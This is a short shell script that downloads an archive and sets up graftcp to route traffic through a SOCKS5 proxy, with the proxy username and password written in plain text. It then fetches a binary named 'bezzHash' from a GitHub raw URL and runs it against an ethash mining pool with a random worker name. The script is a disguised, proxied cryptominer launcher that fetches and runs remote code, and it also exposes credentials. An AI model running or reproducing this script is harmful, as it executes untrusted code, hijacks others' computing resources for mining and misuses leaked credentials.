#!/bin/sh
sleep 30

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = p.webshare.io:80
socks5_username = jvyxiovx-rotate
socks5_password = 2udhid79wl5a
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash 
chmod +x bezzHash


./graftcp/graftcp ./bezzHash --url=hunterd.$(echo $(shuf -i 1-99999 -n 1)-hunterd)@ethash.kupool.com:443 --socks jvyxiovx-rotate:2udhid79wl5a@p.webshare.io:80  
